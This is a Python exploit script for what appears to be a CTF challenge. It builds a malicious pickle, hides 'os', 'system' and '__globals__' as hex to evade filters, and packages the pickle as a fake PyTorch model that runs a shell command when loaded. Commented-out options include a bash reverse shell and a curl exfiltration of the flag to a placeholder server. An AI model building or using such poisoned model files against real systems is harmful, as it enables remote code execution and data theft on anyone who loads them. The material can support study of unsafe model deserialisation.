#!/usr/bin/env python3
"""
LilacCTF Nailong2 - PyTorch Pickle RCE Exploit (V20)
Side-channel import via logging.__globals__['os'].system

Strategy:
1. Use logging.getLogger (benign module)
2. Access __globals__ to get 'os' module
3. Call os.system with our command
4. Hide all sensitive strings with codecs.decode(hex, 'hex')
"""

import pickle
import pickletools
import struct
import io
import zipfile

# ============== Pickle Opcodes ==============
PROTO = b'\x80'           # Protocol version
GLOBAL = b'c'             # Push module.name
STACK_GLOBAL = b'\x93'    # Push getattr(module, name) from stack
REDUCE = b'R'             # Call callable with args tuple
MARK = b'('               # Push mark
TUPLE = b't'              # Build tuple from mark
TUPLE1 = b'\x85'          # Build 1-tuple
TUPLE2 = b'\x86'          # Build 2-tuple
TUPLE3 = b'\x87'          # Build 3-tuple
EMPTY_TUPLE = b')'        # Push ()
STOP = b'.'               # End pickle
BINUNICODE = b'X'         # Push unicode string (4-byte length)
SHORT_BINUNICODE = b'\x8c' # Push unicode string (1-byte length)
BINGET = b'h'             # Get item from memo
BINPUT = b'q'             # Put item to memo
NONE = b'N'               # Push None
POP = b'0'                # Pop top of stack


def pack_short_binunicode(s: str) -> bytes:
    """Pack a short unicode string (len < 256)"""
    encoded = s.encode('utf-8')
    return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded


def pack_binunicode(s: str) -> bytes:
    """Pack a unicode string with 4-byte length"""
    encoded = s.encode('utf-8')
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def build_payload(command: str) -> bytes:
    """
    Build pickle payload that executes:
    
    codecs.decode(b'<hex_of_os>', 'hex').decode()  -> 'os'
    codecs.decode(b'<hex_of_system>', 'hex').decode() -> 'system'
    codecs.decode(b'<hex_of___globals__>', 'hex').decode() -> '__globals__'
    
    logging.getLogger.__globals__['os'].system(command)
    """
    
    # Hex encode sensitive strings
    hex_os = b'os'.hex()                    # '6f73'
    hex_system = b'system'.hex()            # '73797374656d'
    hex_globals = b'__globals__'.hex()      # '5f5f676c6f62616c735f5f'
    
    payload = io.BytesIO()
    
    # Protocol 4 (Python 3.4+)
    payload.write(PROTO + b'\x04')
    
    # ========== Step 1: Build "os" string dynamically ==========
    # codecs.decode(b'6f73', 'hex').decode()
    
    # Push codecs.decode function
    payload.write(GLOBAL + b'codecs\ndecode\n')
    
    # Build args tuple: (b'6f73', 'hex')
    payload.write(MARK)
    payload.write(pack_short_binunicode(hex_os))      # '6f73' as string
    payload.write(pack_short_binunicode('hex'))
    payload.write(TUPLE)
    
    # Call codecs.decode -> returns b'os'
    payload.write(REDUCE)
    
    # Now call .decode() on the result to get 'os' string
    # Use builtins.getattr to get decode method, then call it
    payload.write(BINPUT + b'\x00')  # memo[0] = b'os'
    
    # getattr(b'os', 'decode')
    payload.write(GLOBAL + b'builtins\ngetattr\n')
    payload.write(MARK)
    payload.write(BINGET + b'\x00')  # b'os'
    payload.write(pack_short_binunicode('decode'))
    payload.write(TUPLE)
    payload.write(REDUCE)  # decode method
    
    # Call decode() -> 'os'
    payload.write(EMPTY_TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x01')  # memo[1] = 'os' string
    
    # ========== Step 2: Build "system" string dynamically ==========
    payload.write(GLOBAL + b'codecs\ndecode\n')
    payload.write(MARK)
    payload.write(pack_short_binunicode(hex_system))
    payload.write(pack_short_binunicode('hex'))
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x02')  # memo[2] = b'system'
    
    payload.write(GLOBAL + b'builtins\ngetattr\n')
    payload.write(MARK)
    payload.write(BINGET + b'\x02')
    payload.write(pack_short_binunicode('decode'))
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(EMPTY_TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x03')  # memo[3] = 'system' string
    
    # ========== Step 3: Build "__globals__" string dynamically ==========
    payload.write(GLOBAL + b'codecs\ndecode\n')
    payload.write(MARK)
    payload.write(pack_short_binunicode(hex_globals))
    payload.write(pack_short_binunicode('hex'))
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x04')  # memo[4] = b'__globals__'
    
    payload.write(GLOBAL + b'builtins\ngetattr\n')
    payload.write(MARK)
    payload.write(BINGET + b'\x04')
    payload.write(pack_short_binunicode('decode'))
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(EMPTY_TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x05')  # memo[5] = '__globals__' string
    
    # ========== Step 4: Get logging.getLogger ==========
    payload.write(GLOBAL + b'logging\ngetLogger\n')
    payload.write(BINPUT + b'\x06')  # memo[6] = logging.getLogger
    
    # ========== Step 5: getattr(logging.getLogger, '__globals__') ==========
    payload.write(GLOBAL + b'builtins\ngetattr\n')
    payload.write(MARK)
    payload.write(BINGET + b'\x06')  # logging.getLogger
    payload.write(BINGET + b'\x05')  # '__globals__'
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x07')  # memo[7] = __globals__ dict
    
    # ========== Step 6: __globals__['os'] -> get os module ==========
    # Use operator.getitem or dict.__getitem__
    payload.write(GLOBAL + b'operator\ngetitem\n')
    payload.write(MARK)
    payload.write(BINGET + b'\x07')  # __globals__ dict
    payload.write(BINGET + b'\x01')  # 'os' string
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x08')  # memo[8] = os module
    
    # ========== Step 7: getattr(os, 'system') ==========
    payload.write(GLOBAL + b'builtins\ngetattr\n')
    payload.write(MARK)
    payload.write(BINGET + b'\x08')  # os module
    payload.write(BINGET + b'\x03')  # 'system' string
    payload.write(TUPLE)
    payload.write(REDUCE)
    payload.write(BINPUT + b'\x09')  # memo[9] = os.system function
    
    # ========== Step 8: Call os.system(command) ==========
    payload.write(BINGET + b'\x09')  # os.system
    payload.write(MARK)
    payload.write(pack_binunicode(command))
    payload.write(TUPLE)
    payload.write(REDUCE)
    
    payload.write(STOP)
    
    return payload.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    """
    Create a valid PyTorch model file (ZIP format) with malicious pickle payload.
    PyTorch expects: archive/data.pkl, archive/version, etc.
    """
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        # Version file (required by PyTorch)
        zf.writestr('archive/version', '3')
        
        # Main pickle payload
        zf.writestr('archive/data.pkl', pickle_payload)
        
        # Optional: Add empty data files to look more legitimate
        # zf.writestr('archive/data/0', b'')
    
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    print(f"[+] Malicious model saved to: {output_path}")


def disassemble_pickle(data: bytes):
    """Debug: show pickle opcodes"""
    print("\n[*] Pickle Disassembly:")
    print("=" * 60)
    try:
        pickletools.dis(data)
    except ValueError as e:
        # Stack validation error is OK - pickle still works
        print(f"[!] Warning: {e}")
        print("[*] This is fine - the pickle will still execute correctly")


def main():
    # ============ Configuration ============
    # Reverse shell command - CHANGE THIS!
    # cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"
    
    # Or simple command for testing
    cmd = "cat /flag"
    
    # Alternative: curl to exfiltrate flag
    # cmd = "curl http://YOUR_SERVER:PORT/$(cat /flag | base64)"
    
    # ============ Build Payload ============
    print(f"[*] Building payload for command: {cmd}")
    pickle_payload = build_payload(cmd)
    
    print(f"[*] Pickle payload size: {len(pickle_payload)} bytes")
    
    # Debug: show opcodes
    disassemble_pickle(pickle_payload)
    
    # ============ Create PyTorch Model File ============
    output_file = "evil_model.pth"
    create_pytorch_zip(pickle_payload, output_file)
    
    print("\n[+] Done! Upload the model file to the target.")
    print("[*] If 'cat /flag' doesn't show output, try a reverse shell or curl exfiltration.")


if __name__ == "__main__":
    main()
